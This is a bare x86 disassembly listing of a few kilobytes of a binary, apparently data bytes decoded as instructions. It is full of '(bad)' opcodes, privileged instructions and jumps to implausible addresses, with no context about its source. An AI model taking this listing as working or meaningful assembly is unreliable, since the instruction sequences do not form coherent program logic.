  43187d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43187e:	inc    ebp
  43187f:	dec    ebp
  431880:	xor    ebx,DWORD PTR ss:[ebx+esi*1+0x3d00389]
  431888:	inc    ebp
  431889:	(bad)  
  43188b:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  431893:	sar    eax,1
  431895:	rol    BYTE PTR [ebp+0x5],1
  431898:	xor    eax,DWORD PTR [ebp+0x3]
  43189b:	jmp    0x431888
  43189d:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  4318a3:	xor    eax,DWORD PTR [ebp+0x33]
  4318a6:	mov    eax,DWORD PTR [ebx]
  4318a8:	rol    BYTE PTR [ebx],1
  4318aa:	test   BYTE PTR [edi],cl
  4318ac:	cdq    
  4318ad:	shl    DWORD PTR [edx],0x4d
  4318b0:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  4318b6:	xor    edx,eax
  4318b8:	add    eax,DWORD PTR ds:0xeb4d45e0
  4318be:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  4318c4:	add    BYTE PTR [ebx],dh
  4318c6:	inc    ebp
  4318c7:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  4318cd:	rdpmc  
  4318cf:	rol    DWORD PTR [ebx],0x4d
  4318d2:	loopne 0x43185f
  4318d4:	push   ebp
  4318d5:	in     al,dx
  4318d6:	mov    cl,dl
  4318d8:	adc    eax,edx
  4318da:	jb     0x4318e1
  4318dc:	add    BYTE PTR [ebp+0x45],al
  4318df:	jmp    0x43186c
  4318e1:	mov    ebx,eax
  4318e3:	test   al,0xcb
  4318e5:	dec    ebp
  4318e6:	dec    ebp
  4318e7:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  4318ed:	add    ebx,DWORD PTR [ecx-0x743ecdf1]
  4318f3:	dec    ebp
  4318f4:	mov    al,0x8b
  4318f6:	dec    ebp
  4318f7:	in     al,dx
  4318f8:	xor    edx,ecx
  4318fa:	xor    edx,eax
  4318fc:	add    eax,DWORD PTR [ebp+0x3]
  4318ff:	jbe    0x431910
  431901:	mov    eax,ecx
  431903:	test   al,0x45
  431905:	dec    ebp
  431906:	mov    DWORD PTR [ebx],esi
  431908:	loopne 0x43193d
  43190a:	inc    ebp
  43190b:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  431911:	rol    esi,0x45
  431914:	scas   eax,DWORD PTR es:[edi]
  431915:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  43191b:	mov    eax,ecx
  43191d:	hlt    
  43191e:	dec    ebp
  43191f:	inc    ebp
  431920:	mov    eax,edi
  431922:	loopne 0x4318fc
  431924:	retf   
  431925:	test   esi,ecx
  431927:	clc    
  431928:	scas   eax,DWORD PTR es:[edi]
  431929:	inc    ebp
  43192a:	mov    eax,edi
  43192c:	fdiv   st,st(0)
  43192e:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  431934:	cdq    
  431935:	cmp    BYTE PTR [edx],dh
  431937:	pushf  
  431938:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  43193e:	inc    esi
  431940:	mov    ebp,DWORD PTR [eax-0x10]
  431943:	inc    ebp
  431944:	dec    ebp
  431945:	xor    esi,DWORD PTR [ebx]
  431947:	add    eax,DWORD PTR [ebx]
  431949:	loopne 0x43195a
  43194b:	dec    ebp
  43194c:	ror    DWORD PTR [edx+0x7233084d],0x3
  431953:	add    BYTE PTR [ebx-0x7b740bbb],cl
  431959:	lock cdq 
  43195b:	ret    
  43195c:	xor    al,BYTE PTR [ebp-0x77]
  43195f:	mov    esi,esp
  431961:	rol    BYTE PTR [ebp-0x7c],1
  431964:	xor    ebx,DWORD PTR [ecx-0x7772cd47]
  43196a:	call   edi
  43196c:	enter  0x4d45,0x8b
  431970:	mov    esi,eax
  431972:	fmul   st(3),st
  431974:	push   ebp
  431975:	dec    ebp
  431976:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  43197c:	ret    0xc199
  43197f:	xor    al,BYTE PTR [esi-0x280276]
  431985:	dec    ebp
  431986:	jne    0x4319bb
  431988:	mov    eax,DWORD PTR [ebx]
  43198a:	cld    
  43198b:	loopne 0x43193d
  43198d:	push   ebp
  43198e:	add    DWORD PTR [eax+0x72851100],ecx
  431994:	inc    DWORD PTR [eax]
  431996:	inc    DWORD PTR [ebp-0x75]
  431999:	mov    edi,esp
  43199b:	lock add bl,0x1
  43199f:	retf   
  4319a0:	add    dh,al
  4319a2:	xor    dh,cl
  4319a4:	inc    ebp
  4319a5:	scas   eax,DWORD PTR es:[edi]
  4319a6:	mov    eax,DWORD PTR [ebx]
  4319a8:	shl    al,0x0
  4319ab:	inc    ebp
  4319ac:	dec    DWORD PTR [ebx+0x4dccf0ff]
  4319b2:	call   0x462bea
  4319b7:	ud0    eax,ecx
  4319ba:	adc    al,0x4d
  4319bc:	inc    ebp
  4319bd:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  4319c3:	lock push 0x338055
  4319c9:	add    eax,DWORD PTR [eax]
  4319cb:	ud0    ecx,edx
  4319ce:	sbb    BYTE PTR [ebp+0x5e],dl
  4319d1:	xor    ecx,ecx
  4319d3:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  4319da:	push   ecx
  4319db:	add    BYTE PTR [ebp-0x38],cl
  4319de:	mov    DWORD PTR [esi-0x740004],eax
  4319e4:	cld    
  4319e5:	inc    ebp
  4319e6:	nop
  4319e7:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  4319ed:	xabort 0xaf
  4319f0:	icebp  
  4319f1:	mov    esi,DWORD PTR [ebp-0x28]
  4319f4:	(bad)  
  4319f5:	retf   
  4319f6:	or     ecx,eax
  4319f8:	(bad)  
  4319f9:	dec    ebp
  4319fa:	pop    es
  4319fb:	(bad)  
  4319fc:	(bad)  
  4319fd:	or     BYTE PTR [esi],al
  4319ff:	jb     0x4319c7
  431a01:	add    BYTE PTR [ebx],al
  431a03:	inc    ebp
  431a04:	(bad)  
  431a05:	mov    ecx,DWORD PTR [edx]
  431a07:	fadd   st(6),st
  431a09:	ret    
  431a0a:	add    ah,BYTE PTR [edi-0x37]
  431a0d:	int    0x55
  431a0f:	sub    ebp,esp
  431a11:	add    edx,DWORD PTR [ecx-0x14]
  431a14:	inc    ebp
  431a15:	inc    ebp
  431a16:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  431a1c:	cld    
  431a1d:	(bad)  
  431a1e:	mov    WORD PTR [edi+0xf893be0],gs
  431a24:	mov    ebp,ebp
  431a26:	clc    
  431a27:	push   eax
  431a29:	push   DWORD PTR [ebp-0x4]
  431a2c:	mov    BYTE PTR [ebp+0xa],0xff
  431a30:	(bad)  
  431a31:	int3   
  431a32:	or     BYTE PTR [eax],al
  431a34:	(bad)  
  431a35:	lea    eax,[edi]
  431a37:	ins    BYTE PTR es:[edi],dx
  431a38:	(bad)  
  431a39:	inc    DWORD PTR [ecx]
  431a3b:	push   eax
  431a3c:	mov    BYTE PTR [ebp+0x9],0x8b
  431a40:	leave  
  431a41:	les    edx,FWORD PTR [ebp+0x0]
  431a44:	in     al,dx
  431a45:	call   DWORD PTR [ecx-0x75]
  431a48:	inc    ebp
  431a49:	cld    
  431a4a:	mov    DWORD PTR [eax+0x8b01fc],eax
  431a50:	cld    
  431a51:	xor    BYTE PTR [edi-0x76a8f98b],bh
  431a57:	std    
  431a58:	mov    eax,DWORD PTR [eax]
  431a5a:	clc    
  431a5b:	test   eax,esi
  431a5d:	je     0x431ad4
  431a5f:	mov    eax,esi
  431a61:	cld    
  431a62:	add    al,0x80
  431a64:	add    WORD PTR [ecx+0x0],ax
  431a68:	fiadd  DWORD PTR [eax]
  431a6a:	mov    BYTE PTR [eax],0xd6
  431a6d:	push   0xffffffc3
  431a6f:	push   edi
  431a70:	mov    edx,DWORD PTR [eax+0x51]
  431a73:	pop    edi
  431a74:	lea    ebx,[ebx-0x8]
  431a77:	ret    0x45
  431a7a:	mov    ecx,DWORD PTR [ebx-0x7243ae04]
  431a80:	xchg   eax,edi
  431a82:	mov    DWORD PTR [ebp-0x75],ecx
  431a85:	push   esi
  431a86:	clc    
  431a87:	jne    0x431a59
  431a89:	mov    ecx,0xf8450b0b
  431a8e:	(bad)  
  431a8f:	push   cs
  431a90:	or     BYTE PTR [ebp-0x3a],dh
  431a93:	cmp    eax,DWORD PTR [ecx]
  431a95:	pop    esi
  431a96:	(bad)  
  431a97:	or     al,0x5
  431a99:	inc    eax
  431a9a:	leave  
  431a9b:	jmp    0x40cf:0x21564204
  431aa2:	leave  
  431aa3:	jmp    0xdace5ba7
  431aa8:	mov    eax,DWORD PTR [edx-0x3a]
  431aab:	jle    0x431aa3
  431aad:	inc    eax
  431aae:	nop
  431aaf:	in     al,dx
  431ab0:	inc    ebx
  431ab2:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  431ab8:	add    eax,0xff45e8f8
  431abd:	push   esi
  431abe:	push   DWORD PTR [ebp-0x39]
  431ac1:	mov    eax,0x7e9da46
  431ac6:	or     al,0x6
  431ac8:	push   DWORD PTR [ebp-0x3a]
  431acb:	cmp    eax,DWORD PTR [edx]
  431acd:	pop    esi
  431ace:	ret    
  431acf:	or     al,0x56
  431ad1:	inc    ecx
  431ad2:	push   ebp
  431ad3:	jle    0x431ac1
  431ad5:	inc    edx
  431ad6:	inc    ebp
  431ad7:	leave  
  431ad8:	add    DWORD PTR [ecx+0x28],eax
  431adb:	and    esp,edi
  431add:	inc    ecx
  431ade:	jne    0x431ac7
  431ae0:	add    DWORD PTR [edx+0x1c],eax
  431ae3:	retf   0xc38b
  431ae6:	adc    al,0x8b
  431ae8:	xchg   edx,eax
  431ae9:	push   ecx
  431aea:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  431af0:	rcl    DWORD PTR [esi-0x9],cl
  431af3:	jne    0x431b45
  431af5:	mov    eax,0x7c80ece
  431afa:	rol    DWORD PTR [esi],cl
  431afc:	div    DWORD PTR [ebp+0x50]
  431aff:	cmp    ecx,edx
  431b01:	pop    esi
  431b02:	dec    BYTE PTR [edx]
  431b04:	in     al,dx
  431b05:	inc    edx
  431b06:	sub    ebp,ebp
  431b08:	inc    eax
  431b09:	(bad)  
  431b0a:	push   eax
  431b0b:	add    edx,DWORD PTR [eax-0x13]
  431b0e:	push   edi
  431b0f:	add    dh,dh
  431b11:	leave  
  431b12:	adc    DWORD PTR [ebp-0x1],0xffffffec
  431b16:	add    BYTE PTR [ecx+0x0],dl
  431b19:	inc    ebp
  431b1a:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  431b20:	add    BYTE PTR [eax-0x7fbf448],bh
  431b26:	add    al,0x2
  431b28:	jmp    0x57ec682
  431b2d:	jne    0x431b17
  431b2f:	mov    eax,DWORD PTR [edx]
  431b31:	or     BYTE PTR [eax],al
  431b33:	inc    ecx
  431b34:	stc    
  431b35:	jmp    0xe7825b70
  431b3a:	jge    0x431b7d
  431b3c:	mov    esi,ebp
  431b3e:	lock ret 0x7d
  431b42:	and    ecx,DWORD PTR [ebx-0x171777]
  431b48:	add    bh,bh
  431b4a:	aad    0xd7
  431b4c:	add    dh,cl
  431b4e:	clts   
  431b50:	(bad)  
  431b51:	call   0xffce1a56
  431b56:	hlt    
  431b57:	iret   
  431b58:	jge    0x431b30
  431b5a:	rol    DWORD PTR [esi-0x80],cl
  431b5d:	cmc    
  431b5e:	or     BYTE PTR [edi-0x27],cl
  431b61:	(bad)  
  431b62:	out    dx,al
  431b63:	mov    eax,DWORD PTR [ebx]
  431b65:	(bad)  
  431b66:	pop    esi
  431b67:	push   es
  431b68:	cmp    al,0xe8
  431b6a:	sar    edi,0x8
  431b6d:	inc    DWORD PTR [edi]
  431b6f:	inc    esi
  431b70:	(bad)  
  431b71:	in     al,dx
  431b72:	jle    0x431bcb
  431b74:	push   cs
  431b75:	push   ebx
  431b76:	add    BYTE PTR [ebx+0x24008b56],cl
  431b7c:	add    BYTE PTR [ebp+0x50],al
  431b7f:	push   eax
  431b80:	add    DWORD PTR [ebx+0x757d1834],ecx
  431b86:	sub    edx,DWORD PTR [esi-0x24]
  431b89:	jne    0x431b41
  431b8b:	lods   eax,DWORD PTR ds:[esi]
  431b8c:	mov    edx,DWORD PTR [edx-0x34]
  431b8f:	dec    esi
  431b90:	out    0x83,eax
  431b92:	into   
  431b93:	push   edi
  431b95:	loopne 0x431b65
  431b97:	shr    BYTE PTR [edx+ecx*4+0x0],1
  431b9b:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  431ba2:	rol    DWORD PTR [edx],0x8
  431ba5:	mov    esp,ecx
  431ba7:	cmp    DWORD PTR [ebx],0xc
  431baa:	mov    esi,0x5001c0
  431baf:	push   eax
  431bb0:	push   cs
  431bb1:	push   eax
  431bb2:	(bad)  
  431bb3:	sub    edx,edi
  431bb5:	push   esi
  431bb6:	adc    al,0xcb
  431bb8:	ins    DWORD PTR es:[edi],dx
  431bb9:	mov    eax,0x203e8
  431bbe:	add    al,ah
  431bc0:	ror    BYTE PTR [eax+0xc007c0],0xc0
  431bc7:	add    dh,al
  431bc9:	add    ah,ch
  431bcb:	rol    DWORD PTR [ebx-0x3595fb0d],1
  431bd1:	pop    ecx
  431bd2:	or     eax,ebx
  431bd4:	cli    
  431bd5:	add    BYTE PTR [ecx-0x4e728d1e],dh
  431bdb:	lea    ebp,[ebx]
  431bdd:	mov    edx,DWORD PTR [edx-0x4]
  431be0:	dec    ecx
  431be1:	inc    ebp
  431be2:	shr    BYTE PTR [ebx],0x4b
  431be5:	and    al,0x0
  431be7:	(bad)  
  431be8:	jne    0x431c2f
  431bea:	pop    eax
  431beb:	mov    al,0x5a
  431bed:	call   0x1421e4c
  431bf2:	and    al,0x85
  431bf4:	push   edx
  431bf5:	add    BYTE PTR [eax+eax*1+0x0],ah
  431bf9:	dec    ebp
  431bfa:	mov    cl,0x23
  431bfc:	jmp    0x431bea
  431bfe:	mov    al,0xe7
  431c00:	call   0x1391eee
  431c05:	shr    DWORD PTR [eax+ebx*2],cl
  431c08:	lock (bad) 
  431c0a:	adc    eax,0x757f008d
  431c0f:	out    0x58,eax
  431c11:	cmp    al,0x7
  431c13:	pop    edx
  431c14:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  431c1b:	push   ecx
  431c1c:	cld    
  431c1d:	mov    esi,0x3b0175
  431c22:	and    al,0xb0
  431c24:	xor    BYTE PTR [edx+0x1],0x8b
  431c28:	add    ah,bh
  431c2a:	mov    edi,DWORD PTR [ebp-0x4]
  431c2d:	psubsw mm7,QWORD PTR [edi]
  431c30:	add    DWORD PTR [ebp+0x0],ebp
  431c33:	rcr    eax,1
  431c35:	mov    edi,ecx
  431c37:	and    eax,DWORD PTR [eax]
  431c39:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  431c3f:	call   0x1301f28
  431c44:	add    al,cl
  431c46:	mov    ebp,esi
  431c48:	aam    0x83
  431c4a:	or     DWORD PTR [ecx],eax
  431c4c:	jne    0x431c3f
  431c4e:	mov    eax,DWORD PTR [eax]
  431c50:	aam    0x0
  431c52:	dec    ebp
  431c53:	jne    0x431be0
  431c55:	cmp    ebx,eax
  431c57:	jb     0x431ca6
  431c59:	jmp    0x431be6
  431c5b:	mov    ebx,esp
  431c5d:	int3   
  431c5e:	dec    ebp
  431c5f:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  431c66:	mov    edx,0x8b0a8b
  431c6b:	cmp    ecx,DWORD PTR [eax]
  431c6d:	jb     0x431c46
  431c6f:	pop    edx
  431c70:	push   edi
  431c71:	cli    
  431c72:	pop    es
  431c73:	mov    eax,ecx
  431c75:	jb     0x431c79
  431c77:	add    DWORD PTR [ebx],0xa
  431c7a:	mov    eax,DWORD PTR [ebx]
  431c7c:	int3   
  431c7d:	add    bh,BYTE PTR [esi+0x75d10006]
  431c83:	jmp    0x431c10
  431c85:	mov    al,0xe8
  431c87:	call   0x1041f09
  431c8c:	add    edx,DWORD PTR [ecx+ecx*8]
  431c8f:	pop    edi
  431c90:	or     BYTE PTR [ecx-0x73],bl
  431c93:	pop    ecx
  431c94:	inc    edi
  431c95:	xor    al,0xeb
  431c97:	push   ecx
  431c98:	mov    edi,DWORD PTR [edx+0xc506cc]
  431c9e:	call   0xb21da3
  431ca3:	int3   
  431ca4:	sbb    BYTE PTR [esi],ch
  431ca6:	inc    ebp
  431ca7:	add    BYTE PTR [ebx-0x1f4f338b],cl
  431cad:	call   0x9c1f1c
  431cb2:	or     BYTE PTR [ebx-0x73],dl
  431cb5:	cmp    al,0x47
  431cb7:	mov    al,0x1
  431cb9:	jb     0x431cbb
  431cbb:	mov    al,0x10
  431cbd:	push   eax
  431cbe:	add    al,0x75
  431cc0:	add    BYTE PTR [ebx],ch
  431cc2:	add    ebx,esp
  431cc4:	int3   
  431cc5:	jne    0x431cd7
  431cc7:	movsx  edx,cl
  431cca:	add    DWORD PTR [eax],eax
  431ccc:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  431cd3:	mov    gs,edi
  431cd5:	add    BYTE PTR [eax-0x50],ch
  431cd8:	add    al,ch
  431cda:	mov    eax,DWORD PTR [ecx]
  431cdc:	sub    eax,DWORD PTR [eax]
  431cde:	jb     0x431d55
  431ce0:	add    DWORD PTR [esp+eiz*8-0x50],esi
  431ce4:	jge    0x431cce
  431ce6:	add    al,0x1
  431ce8:	add    DWORD PTR [eax],0x0
  431ceb:	jne    0x431ced
  431ced:	je     0x431d34
  431cef:	mov    eax,DWORD PTR [edi]
  431cf1:	ror    BYTE PTR [ebp+0x4d],1
  431cf4:	or     DWORD PTR [ecx+0x4d03d004],0x3
  431cfb:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431d01:	mov    DWORD PTR [ebx],ebp
  431d03:	fadd   DWORD PTR [eax+0x75]
  431d06:	inc    eax
  431d07:	pop    eax
  431d08:	lea    ebx,[ecx+0x4f]
  431d0b:	push   0xb1000003
  431d10:	out    dx,eax
  431d11:	add    ebp,DWORD PTR [edx+edx*2]
  431d14:	add    BYTE PTR [ebx+ecx*4],bh
  431d17:	mov    ch,BYTE PTR [ebx]
  431d19:	jb     0x431d8d
  431d1b:	add    al,0x89
  431d1d:	push   eax
  431d1e:	call   0x842b6a90
  431d23:	add    DWORD PTR [eax+eax*1],eax
  431d26:	jae    0x431d3c
  431d28:	icebp  
  431d29:	inc    ebp
  431d2a:	mov    eax,DWORD PTR gs:[ecx]
  431d2d:	int3   
  431d2e:	out    dx,al
  431d2f:	loopne 0x431d7e
  431d31:	sub    eax,DWORD PTR [edx]
  431d33:	push   0xffffff83
  431d35:	pop    esi
  431d36:	push   cs
  431d37:	jl     0x431d52
  431d39:	add    al,0xaf
  431d3b:	xor    eax,0x832b6d00
  431d40:	mov    eax,DWORD PTR [edx]
  431d42:	rcr    BYTE PTR [ebp+0x754500dc],cl
  431d48:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431d4e:	inc    ebp
  431d4f:	shr    ebx,0x3
  431d52:	or     DWORD PTR [eax],0x4
  431d55:	push   0xffffffa5
  431d57:	pop    esi
  431d58:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431d5f:	jmp    0x431dbe
  431d61:	mov    edi,0xff0272
  431d66:	fdivr  QWORD PTR [ebp+0x5d]
  431d69:	push   0x4e
  431d6b:	pop    ecx
  431d6c:	call   0x436171
  431d71:	mov    DWORD PTR [ebx],eax
  431d73:	in     al,0xc8
  431d75:	rol    BYTE PTR [ebp-0x75],0xc1
  431d79:	call   0xad1f5a
  431d7e:	pop    esi
  431d7f:	enter  0xceff,0x8b
  431d83:	repz mov ecx,DWORD PTR [ebp-0x34]
  431d87:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431d8e:	je     0x431d90
  431d90:	or     DWORD PTR [ebx-0x74183b24],eax
  431d96:	jne    0x431d7c
  431d98:	jmp    0x431d93
  431d9a:	push   DWORD PTR [edx-0x24]
  431d9d:	push   0x4d
  431d9f:	pop    ecx
  431da0:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431da4:	jge    0x431dac
  431da6:	mov    eax,eax
  431da8:	sub    ebp,DWORD PTR [edx+0x24]
  431dab:	pop    esi
  431dac:	inc    ebp
  431dad:	mov    esp,0x8b6077
  431db2:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  431db8:	lods   al,BYTE PTR ds:[esi]
  431db9:	add    BYTE PTR [ebx],bh
  431dbb:	enter  0xce73,0x49
  431dbf:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431dc7:	stc    
  431dc8:	jge    0x431e3c
  431dca:	jnp    0xdd42a139
  431dd0:	call   0xc61ea6
  431dd5:	fadd   st(0),st
  431dd7:	dec    esi
  431dd8:	ins    BYTE PTR es:[edi],dx
  431dd9:	stc    
  431dda:	cmp    al,0x73
  431ddc:	push   ebp
  431ddd:	mov    eax,0xf8028b
  431de2:	jne    0x431da5
  431de4:	mov    esi,ecx
  431de6:	mov    esp,DWORD PTR [ebp+0x2c]
  431de9:	add    edi,DWORD PTR [ebp-0x24]
  431dec:	sub    esp,eax
  431dee:	and    al,0x45
  431df0:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431df6:	sbb    al,0xee
  431df8:	pop    esi
  431df9:	call   0x831e29
  431dfe:	fsubr  st,st(3)
  431e00:	sti    
  431e01:	add    BYTE PTR gs:[ecx],bh
  431e04:	add    eax,esp
  431e06:	add    DWORD PTR [esi],eax
  431e08:	rol    DWORD PTR [ebp+0x8],0x29
  431e0c:	mov    esp,eax
  431e0e:	clc    
  431e0f:	jne    0x431e86
  431e11:	mov    eax,0x8b0673
  431e16:	loopne 0x431e5d
  431e18:	loopne 0x431da3
  431e1a:	lods   al,BYTE PTR ds:[esi]
  431e1b:	int3   
  431e1c:	inc    ebp
  431e1d:	mov    DWORD PTR gs:[eax+edi*8],eax
  431e21:	add    al,0xc3
  431e23:	sub    ecx,DWORD PTR [ebp+0x47]
  431e26:	(bad)  
  431e28:	shr    BYTE PTR [ebp-0x1f],0xe8
  431e2c:	add    eax,DWORD PTR [eax]
  431e2e:	call   0x644df33
  431e33:	add    esi,DWORD PTR [esi-0x3b2efc83]
  431e39:	dec    esi
  431e3a:	ins    DWORD PTR es:[edi],dx
  431e3b:	in     al,dx
  431e3c:	lea    eax,[eax]
  431e3e:	inc    ebp
  431e3f:	inc    ebp
  431e40:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431e46:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431e50:	and    al,0xdc
  431e52:	ror    DWORD PTR [edx+0x24],0xf7
  431e56:	or     BYTE PTR [ebp+0x4c],dh
  431e59:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431e5d:	stos   BYTE PTR es:[edi],al
  431e5e:	adc    edx,edi
  431e60:	inc    esp
  431e61:	add    edi,DWORD PTR [eax]
  431e63:	jne    0x431e48
  431e65:	mov    DWORD PTR [eax-0x7449db04],ecx
  431e6b:	cmp    ecx,DWORD PTR [edi]
  431e6d:	sub    BYTE PTR [ebp-0x7e],dl
  431e70:	sar    ebp,0xb
  431e73:	jmp    FWORD PTR [edi+0x2400392a]
  431e79:	sub    esi,DWORD PTR [ebx-0x73]
  431e7c:	mov    esp,DWORD PTR [ecx+edi*4]
  431e7f:	mov    ecx,DWORD PTR [eax]
  431e81:	and    BYTE PTR [eax],al
  431e83:	jne    0x431e4f
  431e85:	sub    ebp,ecx
  431e87:	sbb    BYTE PTR [esi+0x32],ah
  431e8a:	dec    ebp
  431e8b:	push   ebp
  431e8c:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431e92:	ret    
  431e93:	mov    edx,ebp
  431e95:	leave  
  431e96:	sub    DWORD PTR [esi+0x24],ebx
  431e99:	ret    0x2b
  431e9c:	pop    ax
  431e9e:	push   ebp
  431e9f:	rol    BYTE PTR [ebx],0xeb
  431ea2:	add    DWORD PTR [ecx+0x6c0001],0x40
  431ea9:	jb     0x431f00
  431eab:	ret    
  431eac:	in     al,dx
  431ead:	jecxz  0x431e3a
  431eaf:	push   esi
  431eb0:	xchg   esp,eax
  431eb1:	jne    0x431eb3
  431eb3:	cmp    edx,DWORD PTR [esi+0x1c]
  431eb6:	jne    0x431e9c
  431eb8:	mov    eax,DWORD PTR [ebp-0x77]
  431ebb:	ror    DWORD PTR [ebx+0x899408],0xe0
  431ec2:	mov    esi,DWORD PTR [ebp-0x75]
  431ec5:	pop    esi
  431ec6:	nop
  431ec7:	mov    eax,DWORD PTR [eax]
  431ec9:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431ecf:	add    al,0x0
  431ed1:	inc    ebp
  431ed2:	mov    eax,DWORD PTR [ebx]
  431ed4:	mov    ebp,ebx
  431ed6:	cmp    al,0xf
  431ed8:	or     al,al
  431eda:	inc    ebp
  431edb:	inc    ebp
  431edc:	mov    ebx,DWORD PTR ss:[eax+ecx*8+0xfc6c8b]
  431ee4:	mov    bh,0xc0
  431ee6:	push   ss
  431ee7:	ins    BYTE PTR es:[edi],dx
  431ee8:	push   ecx
  431ee9:	add    BYTE PTR [ecx-0x5],dl
  431eec:	add    eax,0x17200
  431ef1:	sbb    al,0x85
  431ef3:	dec    esp
  431ef4:	je     0x431f2e
  431ef6:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  431efa:	add    BYTE PTR [ebx],bh
  431efc:	(bad)  
  431efd:	and    al,0x39
  431eff:	jae    0x431e9d
  431f01:	mov    cl,cl
  431f03:	inc    DWORD PTR [esp]
  431f06:	push   ebp
  431f07:	shr    esp,0x8
  431f0a:	in     al,dx
  431f0b:	push   esp
  431f0c:	add    DWORD PTR [eax],esp
  431f0e:	add    bl,cl
  431f10:	inc    ebp
  431f11:	mov    bh,0x89
  431f13:	add    ah,bh
  431f15:	jmp    0xca7c2e5f
  431f1a:	pushf  
  431f1b:	dec    esp
  431f1c:	mov    edx,0xf8178520
  431f21:	fst    DWORD PTR [ebp+0x0]
  431f24:	mov    BYTE PTR [eax],0xc4
  431f27:	sub    edx,DWORD PTR [ebx-0x3f]
  431f2a:	inc    ebp
  431f2b:	add    eax,0xc601da
  431f30:	mov    al,0xc6
  431f33:	ins    BYTE PTR es:[edi],dx
  431f34:	mov    DWORD PTR [eax+0x57],0x280545c1
  431f3b:	dec    esp
  431f3c:	jmp    DWORD PTR [eax]
  431f3e:	inc    ebp
  431f3f:	fnstcw WORD PTR [esi+0x29]
  431f42:	test   BYTE PTR [eax],0xc6
  431f45:	rol    BYTE PTR [eax],0xc0
  431f48:	lea    ecx,[ebp-0x3cf0dbcb]
  431f4e:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  431f54:	inc    esi
  431f55:	add    DWORD PTR [eax],ebx
  431f57:	add    dh,bh
  431f59:	mov    esi,DWORD PTR [edx+0x8]
  431f5c:	(bad)  
  431f5d:	fdiv   QWORD PTR ss:[ecx]
  431f60:	(bad)  
  431f61:	mov    bl,ch
  431f63:	add    esi,eax
  431f65:	add    dh,bl
  431f67:	or     esi,eax
  431f69:	mov    dl,0xdf
  431f6b:	add    esi,eax
  431f6d:	add    al,ah
  431f6f:	push   cs
  431f70:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431f77:	or     BYTE PTR [ebx],dh
  431f79:	dec    ecx
  431f7a:	lea    eax,[ebx]
  431f7c:	xor    eax,0x18fc0fc7
  431f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431f82:	repz clc 
  431f84:	add    eax,DWORD PTR [ebp+0x46]
  431f87:	prefetcht0 BYTE PTR [ecx-0x2]
  431f8b:	xor    eax,0x7c60872
  431f90:	mov    esp,0xbd32c699
  431f95:	pop    esi
  431f96:	mov    cl,0xbe
  431f99:	or     al,0xc6
  431f9b:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431fa2:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  431fa9:	add    dh,al
  431fab:	mov    eax,ebx
  431fad:	xor    DWORD PTR [ebx],0x35008dbc
  431fb3:	mov    ecx,DWORD PTR [edi]
  431fb5:	sbb    al,0x18
  431fb7:	inc    ebp
  431fb8:	xrelease mov DWORD PTR [ebx],0x188546f4
  431fbf:	clc    
  431fc0:	(bad)  
  431fc1:	ss jb  0x431f60
  431fc4:	lea    ecx,[ecx+0x45ffe838]
  431fca:	mov    ebp,esp
  431fcc:	fadd   st,st(6)
  431fce:	dec    ebp
  431fcf:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431fd5:	out    0x1,eax
  431fd7:	inc    ebp
  431fd8:	lea    ebp,[ecx]
  431fda:	inc    esi
  431fdc:	dec    eax
  431fde:	enter  0xa33,0xc6
  431fe2:	push   ebp
  431fe3:	leave  
  431fe4:	(bad)  
  431fe5:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  431feb:	add    BYTE PTR [ebp+0x44],al
  431fee:	mov    eax,esp
  431ff0:	mov    WORD PTR [esi+0x44398300],?
  431ff6:	psubusw mm4,QWORD PTR [eax-0x78]
  431ffa:	add    BYTE PTR [ebx-0x1303f975],al
  432000:	add    BYTE PTR [ebp+0x1],0xeb
  432004:	add    BYTE PTR [ebp+0x38],al
  432007:	jmp    0xdbce6551
  43200c:	add    BYTE PTR [ebp+0x0],0xe8
  432010:	mov    DWORD PTR [ebp-0x48],eax
  432013:	sub    DWORD PTR [edi+0x45],ecx
  432016:	add    BYTE PTR [eax],ch
  432018:	js     0x43205f
  43201a:	data16 jle 0x431fa2
  43201d:	idiv   bh
  43201f:	inc    esp
  432020:	(bad)  
  432021:	fadd   st(7),st
  432023:	mov    dh,0x89
  432025:	and    DWORD PTR [esi+0x44],0xffffffff
